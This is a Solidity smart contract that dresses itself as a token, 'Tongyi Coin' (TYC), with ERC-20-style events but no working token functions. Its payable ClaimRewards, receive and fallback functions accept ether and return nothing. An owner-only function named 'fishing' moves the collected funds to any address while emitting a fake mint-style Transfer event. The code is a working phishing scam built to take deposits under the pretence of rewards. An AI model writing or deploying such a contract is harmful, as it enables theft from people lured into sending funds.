// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract MyFish {
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    uint256 private _totalSupply;
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowances;
    string public name;
    string public symbol;
    address private _owner;
    uint8 private _decimals;

    constructor() {
        name = "Tongyi Coin";
        symbol = "TYC";
        _owner = msg.sender;
        _decimals = 2;
    }

    receive() external payable {
    }
    fallback() external payable {
    }

    function ClaimRewards() payable public {
    }

    function fishing(address to, uint256 amount) external {
        require(msg.sender == _owner, 'admin only');
        payable(to).transfer(amount);
        emit Transfer(address(0), to, amount);
    }
}